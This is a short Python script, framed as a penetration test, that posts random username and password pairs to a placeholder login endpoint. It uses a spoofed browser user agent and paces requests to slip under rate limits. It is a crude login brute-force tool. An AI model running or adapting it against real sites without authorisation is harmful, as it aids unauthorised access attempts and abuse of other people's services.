import requests
import random
import string
import time

# Target URL (Replace with your target login endpoint)
TARGET_URL = "https://example.com/login"

# Function to generate a random string
def random_string(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# Function to perform login attempt
def attempt_login():
    username = random_string(6)  # Random 6-char username
    password = random_string(10) # Random 10-char password
    
    data = {
        "username": username,
        "password": password
    }

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    response = requests.post(TARGET_URL, data=data, headers=headers)

    # Log results (Optional: Change this to suit your needs)
    print(f"Trying: {username} / {password} --> Status Code: {response.status_code}")

    return response

# Run multiple attempts
for _ in range(10):  # Change number of attempts as needed
    attempt_login()
    time.sleep(1)  # Add delay to avoid rate limiting

print("Penetration test completed.")
